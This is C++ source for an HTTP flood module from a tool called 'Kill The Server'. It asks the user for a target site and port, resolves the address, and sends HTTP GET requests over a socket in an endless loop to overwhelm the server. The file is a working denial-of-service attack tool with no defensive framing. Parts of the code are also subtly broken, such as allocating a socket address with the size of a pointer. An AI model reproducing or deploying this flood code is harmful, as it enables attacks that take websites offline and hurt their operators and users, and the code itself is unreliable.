/*

	Kill The Server v 0.1
	Copyright (c)Luca Magistrelli 2011

	This program is free software: you can redistribute it and/or modify
    	it under the terms of the GNU General Public License as published by
    	the Free Software Foundation, either version 3 of the License, or
    	(at your option) any later version.

    	This program is distributed in the hope that it will be useful,
    	but WITHOUT ANY WARRANTY; without even the implied warranty of
    	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    	GNU General Public License for more details.

    	You should have received a copy of the GNU General Public License
    	along with this program.  If not, see <http://www.gnu.org/licenses/>.
*/




#include <sys/socket.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <string.h>
#include <iostream>
//old c style
#include <stdio.h>
#include <stdlib.h>

#include "utils.h"

using namespace std;

char *build_get_query(const char *host)
{
    char *USERAGENT ="KTS/0.1";
    char *query;
    char *getpage = "/";
    char *tpl = "GET /%s HTTP/1.0\r\nHost: %s\r\nUser-Agent: %s\r\n\r\n";
    if(getpage[0] == '/'){
        getpage = getpage + 1;
    }
    query = (char *)malloc(strlen(host)+strlen(getpage)+strlen(USERAGENT)+strlen(tpl)-5);
    sprintf(query, tpl, getpage, host, USERAGENT);
    return query;
}


void HTTPAttack(string target, int port=80)
{
    int sock, sent, tmpres;
    struct sockaddr_in *remote;
    char *get;
    if((sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0)
    {
        cout << "[Error]Cannot create socket" << endl;
        return;
    }
    remote = (struct sockaddr_in *)malloc(sizeof(struct sockaddr_in *));
    remote->sin_family = AF_INET;
    tmpres = inet_pton(AF_INET, target.c_str (), (void *)(&(remote->sin_addr.s_addr)));
    remote->sin_port = htons(port);
    if(connect(sock, (struct sockaddr *)remote, sizeof(struct sockaddr)) < 0)
    {
        cout << "couldn't connect to the remote server";
        return;
    }
    get = build_get_query(target.c_str ());
    //flood
    while(1)
    {
        sent = 0;
        while(sent < strlen(get))
        {
            tmpres = send(sock, get+sent, strlen(get)-sent, 0);
            sent += tmpres;
        }
    }
}

//standard module
void HTTPFloodAttackInit()
{
    string target="", ip="";
    int port=0;
    cout << "Insert the site(eg www.google.com): " << endl;
    cin >> target;
    cout << "insert the target port(eg. 80): " << endl;
    cin >> port;
    ip = resolveSite(target);
    if(ip == "")
        return;
    //start the attack
    cout << "#########Target Info#########" << endl;
    cout << "Site: " << target << endl;
    cout << "Ip: " << ip << endl;
    cout << "Port: " << port << endl;
    cout << "#############################" << endl;
    cout << "[INFO]Starting the attack..." << endl;
    HTTPAttack(ip, port);
}

